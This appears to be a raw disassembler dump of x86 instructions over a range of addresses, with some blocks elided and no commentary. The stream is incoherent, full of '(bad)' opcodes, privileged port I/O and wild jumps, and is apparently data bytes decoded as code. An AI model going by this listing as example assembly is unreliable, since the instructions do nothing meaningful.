  41dd38:	into   
  41dd39:	cs jo  0x41dcc4
  41dd3c:	xor    al,0x70
  41dd3e:	mov    cl,ch
  41dd40:	addr16 jbe 0x41dd69
  41dd43:	leave  
  41dd44:	(bad)  
  41dd46:	cmc    
  41dd47:	jecxz  0x41ddbe
  41dd49:	mov    esp,0xefd58bfd
  41dd4e:	das    
  41dd4f:	lods   eax,DWORD PTR ds:[esi]
  41dd50:	in     eax,dx
  41dd51:	mov    ds:0x86eb78b5,eax
  41dd56:	xor    eax,0x38937383
  41dd5b:	shr    DWORD PTR [edi-0x421c2332],cl
  41dd61:	pop    es
  41dd62:	sar    DWORD PTR [edi],cl
  41dd64:	jne    0x41dddb
  41dd66:	mov    bh,0x44
  41dd68:	and    al,0x44
  41dd6a:	pop    ebp
  41dd6b:	cmp    esp,esi
  41dd6d:	addr16 xchg esp,eax
  41dd6f:	aas    
  41dd70:	xor    BYTE PTR [edx+0x7ed0b982],dh
  41dd76:	ror    edi,cl
  41dd78:	cmp    BYTE PTR [edi],ah
  41dd7a:	push   es
  41dd7b:	ret    
  41dd7c:	push   ss
  41dd7d:	test   DWORD PTR [ebx],edx
  41dd7f:	cli    
  41dd80:	rcr    DWORD PTR [ebp+0x3c8910c3],cl
  41dd86:	push   edx
  41dd87:	inc    esi
  41dd88:	mov    al,0x55
  41dd8a:	dec    ecx
  41dd8b:	not    BYTE PTR cs:[ebx]
  41dd8e:	stc    
  41dd8f:	fst    QWORD PTR [eax+eax*1]
	...
  41ddf2:	add    BYTE PTR [eax],al
  41ddf4:	and    bl,dh
  41ddf6:	das    
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	das    
  41de01:	test   eax,0x3dee80c3
  41de06:	add    DWORD PTR [eax],eax
  41de08:	add    eax,0xd000001
  41de0d:	push   edx
  41de0e:	lods   al,BYTE PTR ds:[esi]
  41de0f:	xchg   esp,eax
  41de10:	out    dx,al
  41de11:	sbb    DWORD PTR [edi],ebp
  41de13:	push   ds
  41de14:	jo     0x41de29
  41de16:	test   eax,0xc56c9122
  41de1b:	outs   dx,DWORD PTR ds:[esi]
  41de1c:	lea    esp,[ebp-0x71608679]
  41de22:	ficom  WORD PTR [ebp+0x4a]
  41de25:	loopne 0x41ddbc
  41de27:	int3   
  41de28:	arpl   WORD PTR [esi],cx
  41de2a:	mov    ebx,0x57ab8ce1
  41de2f:	popf   
  41de30:	mov    eax,ds:0x80de61ea
  41de35:	dec    ebp
  41de36:	fnstcw WORD PTR [edi]
  41de38:	mov    esi,0xeb7e3542
  41de3d:	and    al,0xf6
  41de3f:	aad    0x46
  41de41:	sub    bl,al
  41de43:	inc    edi
  41de44:	jecxz  0x41de7d
  41de46:	jmp    0x41ddd5
  41de48:	repnz mov esp,0xbf6bf7bc
  41de4e:	leave  
  41de4f:	xor    al,0x15
  41de51:	jns    0x41de0a
  41de53:	jae    0x41de7b
  41de55:	lds    ecx,FWORD PTR [ebx-0x6b]
  41de58:	fs ret 
  41de5a:	shr    BYTE PTR [edx],1
  41de5c:	gs mov esi,0xdeb5ed2f
  41de62:	add    esi,DWORD PTR [ebp-0x68]
  41de65:	es adc al,0xb2
  41de68:	data16 (bad) 
  41de6a:	lea    ebp,[ebx]
  41de6c:	and    eax,0x9408a03c
  41de71:	pop    ds
  41de72:	dec    ecx
  41de73:	gs adc al,0xcf
  41de76:	jnp    0x41de78
  41de78:	jge    0x41de08
  41de7a:	push   0x6e
  41de7c:	push   es
  41de7d:	stos   BYTE PTR es:[edi],al
  41de7e:	mov    eax,fs
  41de80:	aas    
  41de81:	xchg   esp,eax
  41de82:	xchg   esi,eax
  41de83:	mov    ah,0xe3
  41de85:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de86:	cmp    esp,DWORD PTR [eax]
  41de88:	sbb    BYTE PTR [edx-0x3e],al
  41de8b:	jmp    0xd13197e2
  41de90:	inc    esp
  41de91:	ds dec ecx
  41de93:	sbb    al,BYTE PTR [ebx-0x1c]
  41de96:	iret   
  41de97:	(bad)  
  41de99:	push   ds
  41de9a:	stos   BYTE PTR es:[edi],al
  41de9b:	inc    esi
  41de9c:	xchg   ebx,edx
  41de9e:	pop    esp
  41de9f:	js     0x41dee1
  41dea1:	inc    edi
  41dea2:	shl    cl,cl
  41dea4:	into   
  41dea5:	les    edi,FWORD PTR [eax-0x5a84253f]
  41deab:	test   ecx,edi
  41dead:	test   al,0x39
  41deaf:	lods   eax,DWORD PTR ds:[esi]
  41deb0:	cmp    al,0x30
  41deb2:	adc    al,0x10
  41deb4:	jno    0x41df1a
  41deb6:	jp     0x41dee9
  41deb8:	gs dec eax
  41deba:	shl    DWORD PTR [ebx+0x79],1
  41debd:	pop    es
  41debe:	jo     0x41de75
  41dec0:	mov    ebx,DWORD PTR [edx+0x3390756]
  41dec6:	sub    BYTE PTR [edi-0x77a5f613],ah
  41decc:	add    edi,DWORD PTR [eax-0x7beda072]
  41ded2:	rol    DWORD PTR [ecx],cl
  41ded4:	cmp    DWORD PTR [ecx-0x2472cc3a],eax
  41deda:	imul   edi,DWORD PTR [ebp+0x5cb3abb6],0xffffffe9
  41dee1:	cwde   
  41dee2:	add    ebx,DWORD PTR [edi+0x31]
  41dee5:	aas    
  41dee6:	inc    eax
  41dee7:	cdq    
  41dee8:	inc    eax
  41dee9:	push   edx
  41deea:	push   ebx
  41deeb:	fst    QWORD PTR [eax]
  41deed:	aad    0x61
  41deef:	cmp    BYTE PTR [edx],ah
  41def1:	mov    ebx,0xa0221b20
  41def6:	icebp  
  41def7:	sub    BYTE PTR [ebx+esi*8+0x4b54e50d],bh
  41defe:	push   0xffffffd9
  41df00:	bound  eax,QWORD PTR [edi]
  41df02:	cwde   
  41df03:	imul   ebp,DWORD PTR [ecx+ebx*4],0xffffff9b
  41df07:	dec    eax
  41df08:	pop    ecx
  41df09:	xor    BYTE PTR [edi+0x62],0x94
  41df0d:	jg     0x41dee5
  41df0f:	and    BYTE PTR [ebx],bl
	...
  41df71:	add    BYTE PTR [eax],al
  41df73:	add    BYTE PTR [edi],bh
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0xdb949ce9
  41df82:	int    0x3e
  41df84:	repz add DWORD PTR ds:[eax],eax
  41df88:	add    eax,0xa7000001
  41df8d:	xor    BYTE PTR [edx],bh
  41df8f:	fwait
  41df90:	lds    esi,FWORD PTR [edi+0x67bef0e0]
  41df96:	fdivr  DWORD PTR [edx+0x3f]
  41df99:	in     eax,0xfc
  41df9b:	dec    edi
  41df9c:	pop    ebx
  41df9d:	lods   eax,DWORD PTR ds:[esi]
  41df9e:	dec    esp
  41df9f:	jecxz  0x41dfe5
  41dfa1:	xchg   ecx,eax
  41dfa2:	inc    ecx
  41dfa3:	fmul   st(2),st
  41dfa5:	mov    edx,0xa203f5a0
  41dfaa:	and    edi,ecx
  41dfac:	push   ds
  41dfad:	bt     DWORD PTR [edi+0x7],edi
  41dfb1:	int    0x7a
  41dfb3:	push   cs
  41dfb4:	in     eax,dx
  41dfb5:	jmp    0x41e02e
  41dfb7:	mov    ds:0x7a42c305,al
  41dfbc:	inc    ebp
  41dfbd:	adc    eax,0x35cad37
  41dfc2:	push   ss
  41dfc3:	fwait
  41dfc4:	arpl   WORD PTR ds:0x6d38b799,ax
  41dfca:	out    dx,eax
  41dfcb:	mov    edx,edx
  41dfcd:	pop    ds
  41dfce:	push   esp
  41dfcf:	dec    edx
  41dfd0:	into   
  41dfd1:	dec    edx
  41dfd2:	jne    0x41dfd6
  41dfd4:	pusha  
  41dfd5:	lock ds (bad) 
  41dfd8:	in     eax,0x7e
  41dfda:	addr16 adc bl,ah
  41dfdd:	add    al,0x1c
  41dfdf:	test   al,0xec
  41dfe1:	xchg   edx,eax
  41dfe2:	das    
  41dfe3:	imul   esi,DWORD PTR [eax+0x3b669dfb],0xa2e2c754
  41dfed:	jmp    0xe2a2ff31
  41dff2:	pop    ss
  41dff3:	mov    cl,0x88
  41dff5:	jno    0x41e05b
  41dff7:	icebp  
  41dff8:	pop    ebx
  41dff9:	or     esi,DWORD PTR [esi-0x4b]
  41dffc:	sub    eax,0xe8533fd2
  41e001:	imul   ebp,DWORD PTR [esi+0x5b],0xffffffd5
  41e005:	loope  0x41e032
  41e007:	(bad)  
  41e008:	xor    DWORD PTR [edi+ebp*8],edx
  41e00b:	mov    bh,0xe
  41e00d:	mov    ?,WORD PTR [ebp+0x42]
  41e010:	dec    BYTE PTR [eax-0x81c6de8]
  41e016:	pop    esi
  41e017:	mov    ch,0x31
  41e019:	test   BYTE PTR [ecx-0x40de7cb7],0x77
  41e020:	mov    al,ds:0xabe7effe
  41e025:	mov    bh,0xe5
  41e027:	xor    BYTE PTR [ebx+0x2a1d1e6b],ch
  41e02d:	pop    ss
  41e02e:	jle    0x41e006
  41e030:	jns    0x41e06c
  41e032:	dec    ebx
  41e033:	mov    ebp,0x2652a58f
  41e038:	dec    edx
  41e039:	call   0xe933c9e6
  41e03e:	add    DWORD PTR [edi],0xea8bbc84
  41e044:	pop    ss
  41e045:	out    dx,al
  41e046:	lods   al,BYTE PTR ds:[esi]
  41e047:	jmp    0x41e045
  41e049:	mov    dh,0x81
  41e04b:	inc    esp
  41e04c:	push   0xbc5b2473
  41e051:	sar    BYTE PTR [ebx-0x7eb088ad],cl
  41e057:	push   es
  41e058:	in     al,0x4b
  41e05a:	mov    dh,0x83
  41e05c:	out    dx,al
  41e05d:	rcr    BYTE PTR [esi-0x53],0x24
  41e061:	test   eax,0x80b4f23a
  41e066:	jmp    0x835005ad
  41e06b:	xlat   BYTE PTR ds:[ebx]
  41e06c:	adc    ecx,DWORD PTR [edi+0x7f2365e0]
  41e072:	adc    al,0xbf
  41e074:	mov    ds:0x9284ad53,al
  41e079:	or     eax,0x737b863
  41e07e:	jb     0x41e0f7
  41e080:	push   edx
  41e081:	mov    esp,0x604976d2
  41e086:	inc    edx
  41e087:	xchg   ebp,eax
  41e088:	imul   DWORD PTR [ebx+0x1f390f66]
  41e08e:	sbb    al,0xb9
  41e090:	out    0x0,eax
	...
  41e0f2:	add    BYTE PTR [eax],al
  41e0f4:	dec    edi
  41e0f5:	push   ebx
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	fldenv [eax]
  41e102:	pop    esi
  41e103:	xchg   al,bh
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    eax,0xd4000001
  41e10d:	retf   0x6c35
  41e110:	add    al,BYTE PTR [ebp+0x6e]
  41e113:	pop    edx
  41e114:	mov    ebp,0xb3d6f953
  41e119:	repnz in al,0xe3
  41e11c:	jno    0x41e0fa
  41e11e:	iret   
  41e11f:	clc    
  41e120:	xchg   esp,eax
  41e121:	and    bl,BYTE PTR [esi+ebx*1-0x24d24c7]
  41e128:	(bad)  
  41e129:	repz adc ah,BYTE PTR [ebp+0x31067601]
  41e130:	and    eax,0xc7607e8f
  41e135:	enter  0x2ce6,0x76
  41e139:	dec    ebx
  41e13a:	nop
  41e13b:	aad    0x80
  41e13d:	pop    ebp
  41e13e:	dec    ecx
  41e13f:	add    ch,BYTE PTR [edi-0x72749212]
  41e145:	cld    
  41e146:	aas    
  41e147:	sbb    dh,ch
  41e149:	xchg   esi,eax
  41e14a:	fist   WORD PTR [eax-0x20]
  41e14d:	jae    0x41e19f
  41e14f:	fld    DWORD PTR ds:0xed0aafc7
  41e155:	or     eax,0x72f66ca6
  41e15a:	pop    esi
  41e15b:	sub    DWORD PTR [edx-0x3a480aee],0x97c3df60
  41e165:	fistp  DWORD PTR [ecx-0x6000b258]
  41e16b:	and    DWORD PTR [edx],esp
  41e16d:	pop    ecx
  41e16e:	pop    esi
  41e16f:	in     al,dx
  41e170:	aaa    
  41e171:	not    edi
  41e173:	add    eax,0x997e43a9
  41e178:	(bad)  
  41e179:	push   ss
  41e17a:	sahf   
  41e17b:	dec    edi
  41e17c:	(bad)  
  41e17d:	lds    esi,FWORD PTR [edi-0x8a10ff3]
  41e183:	mov    edi,0xb54fef6e
  41e188:	pop    esi
  41e189:	fsubr  QWORD PTR [ebp+0x5d0e59bd]
  41e18f:	aas    
  41e190:	mov    eax,0x49c8a205
  41e195:	xor    BYTE PTR [esi-0x6f1634d9],ch
  41e19b:	xchg   ecx,eax
  41e19c:	stos   BYTE PTR es:[edi],al
  41e19d:	loop   0x41e204
  41e19f:	cmp    edi,DWORD PTR [ebx+edi*1-0x4a6ca05]
  41e1a6:	stos   BYTE PTR es:[edi],al
  41e1a7:	ins    DWORD PTR es:[edi],dx
  41e1a8:	loopne 0x41e157
  41e1aa:	add    al,0x7
  41e1ac:	in     eax,0x6c
  41e1ae:	cmp    cl,BYTE PTR [edi]
  41e1b0:	add    edi,edx
  41e1b2:	inc    ebp
  41e1b3:	(bad)  
  41e1b5:	mov    edi,0x203880a1
  41e1ba:	sbb    BYTE PTR [ecx],dh
  41e1bc:	retf   0xa0ad
  41e1bf:	dec    ebx
  41e1c0:	xchg   DWORD PTR [eax+0x61],ebx
  41e1c3:	sub    eax,0xa2633e85
  41e1c8:	retf   
  41e1c9:	fsub   QWORD PTR [ebp-0x1f]
  41e1cc:	push   ecx
  41e1cd:	push   es
  41e1ce:	shr    DWORD PTR [esp+eiz*8],1
  41e1d1:	sub    dh,dl
  41e1d3:	add    eax,0x9e081061
  41e1d8:	mov    esi,0x99324e81
  41e1dd:	enter  0xaeca,0x7b
  41e1e1:	and    ebx,esi
  41e1e3:	jge    0x41e206
  41e1e5:	inc    ebx
  41e1e6:	rcl    BYTE PTR [edx+0x615e8e2],cl
  41e1ec:	leave  
  41e1ed:	pop    edi
  41e1ee:	retf   0xc0a8
  41e1f1:	nop
  41e1f2:	pushf  
  41e1f3:	or     DWORD PTR [edi-0x11],esi
  41e1f6:	and    eax,0xbb706897
  41e1fb:	adc    ebx,0x71c37b4
  41e201:	ds cmp al,0xa9
  41e204:	xor    eax,0xcbb10d61
  41e209:	sahf   
  41e20a:	push   DWORD PTR [edx+eiz*1]
  41e20d:	jo     0x41e19b
  41e20f:	outs   dx,BYTE PTR ds:[esi]
  41e210:	clc    
	...
  41e271:	add    BYTE PTR [eax],al
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0xf3
  41e281:	xchg   ebp,eax
  41e282:	gs enter 0x40fd,0x1
  41e287:	add    BYTE PTR ds:0xc000001,al
  41e28d:	ret    
  41e28e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e28f:	out    0x28,eax
  41e291:	ins    BYTE PTR es:[edi],dx
  41e292:	mov    dh,0xf7
  41e294:	or     esp,DWORD PTR [esi]
  41e296:	icebp  
  41e297:	fmul   st,st(7)
  41e299:	jl     0x41e278
  41e29b:	(bad)  
  41e29c:	std    
  41e29d:	je     0x41e25b
  41e29f:	and    dh,bh
  41e2a1:	cmp    BYTE PTR [ebp+eiz*2-0x20b0e1f8],0xa6
  41e2a9:	and    eax,DWORD PTR [ebp-0x5]
  41e2ac:	xor    al,0x4c
  41e2ae:	and    dh,BYTE PTR [ebp+0x77]
  41e2b1:	push   cs
  41e2b2:	sub    al,0xd9
  41e2b4:	push   0x6c39af77
  41e2b9:	lods   eax,DWORD PTR ds:[esi]
  41e2ba:	out    0x52,eax
  41e2bc:	in     eax,dx
  41e2bd:	xchg   esp,eax
  41e2be:	xor    ah,ch
  41e2c0:	ret    0x8926
  41e2c3:	xchg   BYTE PTR es:[esi-0x19e3f424],bh
  41e2ca:	into   
  41e2cb:	pop    eax
  41e2cc:	xor    eax,0x7910063f
  41e2d1:	push   ss
  41e2d2:	adc    eax,0x5d3dc27a
  41e2d7:	jns    0x41e270
  41e2d9:	sbb    DWORD PTR [esp+esi*4],eax
  41e2dc:	inc    edi
  41e2dd:	sti    
  41e2de:	jg     0x41e309
  41e2e0:	sysenter 
  41e2e2:	dec    ecx
  41e2e3:	out    dx,al
  41e2e4:	push   ebx
  41e2e5:	jo     0x41e27d
  41e2e7:	cld    
  41e2e8:	and    BYTE PTR [esi],dh
  41e2ea:	ins    DWORD PTR es:[edi],dx
  41e2eb:	cld    
  41e2ec:	fnsave [edi+0x56f6400a]
  41e2f2:	add    ah,bh
  41e2f4:	mov    eax,0xd8caa09b
  41e2f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e2fa:	push   0xfffffff8
  41e2fc:	mov    eax,0x74880a66
  41e301:	icebp  
  41e302:	dec    esi
  41e303:	sbb    al,BYTE PTR ds:0x725b443
  41e309:	push   es
  41e30a:	retf   
  41e30b:	inc    esi
  41e30c:	xchg   esi,eax
  41e30d:	sahf   
  41e30e:	or     BYTE PTR [esi-0x2a47a302],cl
  41e314:	adc    dh,BYTE PTR [esp+ecx*4]
  41e317:	in     eax,dx
  41e318:	call   0xff28:0x8a441ab4
  41e31f:	aaa    
  41e320:	hlt    
  41e321:	pushf  
  41e322:	ds xchg edx,eax
  41e324:	sbb    al,0x7c
  41e326:	and    eax,0x22f46da6
  41e32b:	rcr    DWORD PTR [edx+0x29],cl
  41e32e:	xchg   ebp,eax
  41e32f:	imul   esi,esp,0xffffffd6
  41e332:	push   ebx
  41e333:	mov    ch,0x89
  41e335:	mov    al,ds:0xb1ee55a8
  41e33a:	and    al,0xe6
  41e33c:	outs   dx,BYTE PTR ds:[esi]
  41e33d:	scas   eax,DWORD PTR es:[edi]
  41e33e:	std    
  41e33f:	fs out 0xad,eax
  41e342:	pop    esp
  41e343:	outs   dx,DWORD PTR ds:[esi]
  41e344:	aaa    
  41e345:	pop    edi
  41e346:	inc    esi
  41e347:	push   ss
  41e348:	icebp  
  41e349:	jmp    0x41e2d2
  41e34b:	cmc    
  41e34c:	pop    edi
  41e34d:	je     0x41e38a
  41e34f:	pop    ds
  41e350:	scas   eax,DWORD PTR es:[edi]
  41e351:	sub    DWORD PTR [esi+0x12af0e6],esp
  41e357:	inc    ecx
  41e358:	xor    eax,0xca077642
  41e35d:	mov    bh,0x27
  41e35f:	mov    bl,0x1e
  41e361:	jne    0x41e355
  41e363:	dec    edi
  41e364:	xchg   ebp,eax
  41e365:	or     DWORD PTR ds:0xaea2a728,ebx
  41e36b:	rcl    ebx,1
  41e36d:	mov    BYTE PTR ds:0x2532a2e1,bh
  41e373:	stc    
  41e374:	test   DWORD PTR ds:0x3d5d420b,ebp
  41e37a:	xchg   ebx,eax
  41e37b:	int    0x9a
  41e37d:	mov    ch,0x19
  41e37f:	jl     0x41e3e7
  41e381:	mov    eax,cs
  41e383:	dec    ebp
  41e384:	and    DWORD PTR [ebp+0x4d8d4543],edx
  41e38a:	aas    
  41e38b:	and    bh,al
  41e38d:	push   edi
  41e38e:	std    
  41e38f:	and    ah,0x0
	...
  41e3f2:	add    BYTE PTR [eax],al
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0xfda58909
  41e403:	jae    0x41e407
  41e405:	inc    edx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    eax,0x1d000001
  41e40d:	clts   
  41e40f:	push   ss
  41e410:	fdiv   st,st(6)
  41e412:	mov    dh,0xb0
  41e414:	mov    ecx,0xb3ed8ff6
  41e419:	push   cs
  41e41a:	pop    ecx
  41e41b:	ror    DWORD PTR [edi+0x54a2dc8c],1
  41e421:	adc    al,0x53
  41e423:	and    bh,0x93
  41e426:	out    0x8a,al
  41e428:	out    dx,eax
  41e429:	hlt    
  41e42a:	sbb    eax,DWORD PTR [edi+0x5f]
  41e42d:	push   ss
  41e42e:	mov    WORD PTR [esp+eax*4],?
  41e431:	jb     0x41e3ce
  41e433:	sub    dh,BYTE PTR [ecx]
  41e435:	(bad)  
  41e436:	aam    0x53
  41e438:	or     BYTE PTR [eax+0x79add82b],ch
  41e43e:	mov    ebx,DWORD PTR [ecx]
  41e440:	fistp  QWORD PTR [ebx-0x75]
  41e443:	dec    esp
  41e444:	pop    esi
  41e445:	mov    eax,ds:0x682b4d4f
  41e44a:	in     al,0x6f
  41e44c:	out    dx,al
  41e44d:	or     BYTE PTR [ebp+0x2a],bl
  41e450:	outs   dx,DWORD PTR ds:[esi]
  41e451:	ins    BYTE PTR es:[edi],dx
  41e452:	push   ebp
  41e453:	jno    0x41e3e9
  41e455:	lods   eax,DWORD PTR ds:[esi]
  41e456:	xchg   ecx,eax
  41e457:	inc    edi
  41e458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e459:	sti    
  41e45a:	push   ss
  41e45b:	icebp  
  41e45c:	imul   esi,edx,0xeeed8db3
  41e462:	mov    eax,0xdb3989ef
  41e467:	inc    esp
  41e468:	in     al,0xa3
  41e46a:	fldlg2 
  41e46c:	and    ecx,DWORD PTR [edi+esi*4-0x76]
  41e470:	sti    
  41e471:	mov    al,0xdc
  41e473:	loope  0x41e4f1
  41e475:	aas    
  41e476:	jne    0x41e433
  41e478:	pusha  
  41e479:	cdq    
  41e47a:	xor    DWORD PTR [ebx],ecx
  41e47c:	test   al,0xc3
  41e47e:	loopne 0x41e4da
  41e480:	xchg   ebx,eax
  41e481:	dec    ecx
  41e482:	stos   DWORD PTR es:[edi],eax
  41e483:	icebp  
  41e484:	cmp    DWORD PTR [ebx+0x75],edi
  41e487:	jl     0x41e4fe
  41e489:	lods   eax,DWORD PTR ds:[esi]
  41e48a:	mov    cl,0xf
  41e48c:	mov    BYTE PTR [ebx-0x6ba906bb],0xc0
  41e493:	out    dx,al
  41e494:	stc    
  41e495:	mov    dl,BYTE PTR [ecx-0x7859baf8]
  41e49b:	into   
  41e49c:	or     cl,BYTE PTR [ebx-0x7b]
  41e49f:	xchg   edx,eax
  41e4a0:	aam    0xf1
  41e4a2:	adc    BYTE PTR [edi-0x27afac6d],bl
  41e4a8:	sbb    BYTE PTR [ebx],cl
  41e4aa:	pop    edi
  41e4ab:	xchg   esp,eax
  41e4ac:	cmp    al,0xe3
  41e4ae:	fwait
  41e4af:	ret    
  41e4b0:	gs (bad) 
  41e4b3:	pop    ds
  41e4b4:	jp     0x41e4b9
  41e4b6:	cli    
  41e4b7:	jl     0x41e483
  41e4b9:	cmp    BYTE PTR gs:[edi],0xd
  41e4bd:	arpl   WORD PTR [eax+0x77806fa8],sp
  41e4c3:	dec    edx
  41e4c4:	pop    es
  41e4c5:	out    0xc1,al
  41e4c7:	dec    esp
  41e4c8:	dec    ebp
  41e4c9:	xchg   ebp,eax
  41e4ca:	aas    
  41e4cb:	xchg   esi,eax
  41e4cc:	sub    eax,0xe8919d6f
  41e4d1:	in     al,dx
  41e4d2:	scas   eax,DWORD PTR es:[edi]
  41e4d3:	push   cs
  41e4d4:	enter  0xf400,0x80
  41e4d8:	xor    cl,BYTE PTR [esi-0x2c6386d2]
  41e4de:	push   es
  41e4df:	push   cs
  41e4e0:	cmp    ebx,ebx
  41e4e2:	push   cs
  41e4e3:	leave  
  41e4e4:	push   ds
  41e4e5:	int3   
  41e4e6:	push   edi
  41e4e7:	aam    0x6c
  41e4e9:	cmp    esp,esi
  41e4eb:	xlat   BYTE PTR ds:[ebx]
  41e4ec:	lea    edi,[ebp+0x5f2a692]
  41e4f2:	push   eax
  41e4f4:	pop    esi
  41e4f5:	mov    al,0x43
  41e4f8:	(bad)  
  41e4f9:	outs   dx,BYTE PTR ds:[esi]
  41e4fa:	shl    ebx,0x95
  41e4fd:	push   0x68
  41e4ff:	cmp    dl,cl
  41e501:	inc    ecx
  41e502:	les    ecx,FWORD PTR [edx+0x4e]
  41e505:	adc    DWORD PTR [edi+0x64],0x79af027c
  41e50c:	fldenv [eax+0x2e5f0]
	...
  41e572:	add    BYTE PTR [eax],al
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e58c
  41e581:	pushf  
  41e582:	aas    
  41e583:	pop    esp
  41e584:	pop    es
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0xbf000001
  41e58d:	cdq    
  41e58e:	jmp    0x4e9dc4fb
  41e593:	sbb    dh,BYTE PTR [ebx+0x46]
  41e596:	sahf   
  41e597:	int3   
  41e598:	into   
  41e599:	jmp    0xa10a:0x8a704c2a
  41e5a0:	xchg   ecx,esp
  41e5a2:	sub    al,0xd7
  41e5a4:	neg    DWORD PTR [esi-0x68]
  41e5a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5a8:	(bad)  
  41e5a9:	pushf  
  41e5aa:	test   DWORD PTR [ebp-0x63c989ca],eax
  41e5b0:	xchg   edx,eax
  41e5b1:	jg     0x41e578
  41e5b3:	xchg   ebp,eax
  41e5b4:	adc    BYTE PTR [esi-0x18],al
  41e5b7:	fucomi st,st(7)
  41e5b9:	cdq    
  41e5ba:	inc    eax
  41e5bb:	enter  0x5da0,0xb0
  41e5bf:	inc    esp
  41e5c0:	push   eax
  41e5c1:	les    ebp,FWORD PTR [edx+edi*1-0x4aa17a67]
  41e5c8:	xchg   edi,eax
  41e5ca:	aad    0x5
  41e5cc:	mov    DWORD PTR [ebp+0x2376cfa6],ecx
  41e5d2:	aad    0x2a
  41e5d4:	in     eax,0x4d
  41e5d6:	xchg   ebx,eax
  41e5d7:	out    0x99,al
  41e5d9:	jnp    0x41e638
  41e5db:	ja     0x41e612
  41e5dd:	mov    WORD PTR [ecx-0x2238044f],?
  41e5e3:	sub    ah,cl
  41e5e5:	dec    ebx
  41e5e6:	fadd   DWORD PTR [eax]
  41e5e8:	test   BYTE PTR [esi+0x3a5f370b],dl
  41e5ee:	push   cs
  41e5ef:	inc    ebx
  41e5f0:	mov    ds:0x8c3ea92b,al
  41e5f5:	call   DWORD PTR [esi]
  41e5f7:	out    0x90,al
  41e5f9:	test   eax,0xd7049353
  41e5fe:	call   0x2d0:0xb93ae71f
  41e605:	mov    ebp,DWORD PTR [edi+0x844dcc0]
  41e60b:	jns    0x41e5f8
  41e60d:	pop    es
  41e60e:	xor    BYTE PTR [edi+esi*1-0x4f],0xc9
  41e613:	faddp  st(5),st
  41e615:	ja     0x41e5b1
  41e617:	xchg   edx,eax
  41e618:	inc    esp
  41e619:	push   0xffffffdb
  41e61b:	mov    esp,0xc3ea1ee6
  41e620:	sub    al,0x1
  41e622:	into   
  41e623:	retf   0x7b93
  41e626:	xchg   ebx,eax
  41e627:	mov    esp,0xb66840ad
  41e62c:	retf   0xf947
  41e62f:	sti    
  41e630:	push   edi
  41e631:	ror    ecx,cl
  41e633:	lea    esp,[edx]
  41e635:	xchg   edi,eax
  41e636:	push   ebx
  41e637:	xlat   BYTE PTR ds:[ebx]
  41e638:	ins    DWORD PTR es:[edi],dx
  41e639:	(bad)  
  41e63a:	xchg   edx,eax
  41e63b:	xchg   edx,eax
  41e63c:	dec    ebx
  41e63d:	popa   
  41e63e:	mov    esi,0xb9ee7fbe
  41e644:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e645:	dec    eax
  41e646:	aaa    
  41e647:	or     BYTE PTR [eax],al
  41e649:	daa    
  41e64a:	fdivr  DWORD PTR [esi]
  41e64c:	xor    BYTE PTR [edi],0xca
  41e64f:	dec    esi
  41e650:	(bad)  
  41e652:	mov    ds,WORD PTR [ecx+0xd8ea37d]
  41e658:	(bad)  
  41e659:	jbe    0x41e68b
  41e65b:	adc    eax,0xdc70e7d3
  41e660:	jbe    0x41e620
  41e662:	and    al,0x95
  41e664:	es test al,0xaa
  41e667:	out    0xe4,al
  41e669:	out    dx,eax
  41e66a:	inc    ebx
  41e66b:	push   es
  41e66c:	pop    eax
  41e66d:	cmp    edx,DWORD PTR [esi-0xa99df89]
  41e673:	repz addr16 pop edi
  41e676:	sbb    eax,0xe914c255
  41e67b:	ss in  al,0x88
  41e67e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e67f:	fidiv  WORD PTR [ebp+0x60]
  41e682:	mov    BYTE PTR [ecx],al
  41e684:	xchg   DWORD PTR [eax],ebx
  41e686:	pop    eax
  41e687:	lods   eax,DWORD PTR ds:[esi]
  41e688:	sub    dl,dl
  41e68a:	pop    ss
  41e68b:	fimul  DWORD PTR [ebx+0x3218508]
	...
  41e6f1:	add    BYTE PTR [eax],al
  41e6f3:	add    ch,al
  41e6f5:	cwde   
  41e6f6:	loope  0x41e74d
  41e6f8:	std    
  41e6f9:	jge    0x41e6f0
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    edx,ebp
  41e701:	sahf   
  41e702:	lahf   
  41e703:	out    dx,al
  41e704:	or     al,0x44
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0x19000001
  41e70d:	inc    ecx
  41e70e:	push   ds
  41e70f:	xor    edx,DWORD PTR [ebx+0x26]
  41e712:	into   
  41e713:	sub    al,0x41
  41e715:	adc    BYTE PTR [edi],al
  41e717:	repz dec edi
  41e719:	jmp    0x79fc5eae
  41e71e:	inc    edi
  41e71f:	jl     0x41e6a8
  41e721:	sub    BYTE PTR [ecx-0x596520a5],0x7
  41e728:	dec    eax
  41e729:	outs   dx,DWORD PTR ds:[esi]
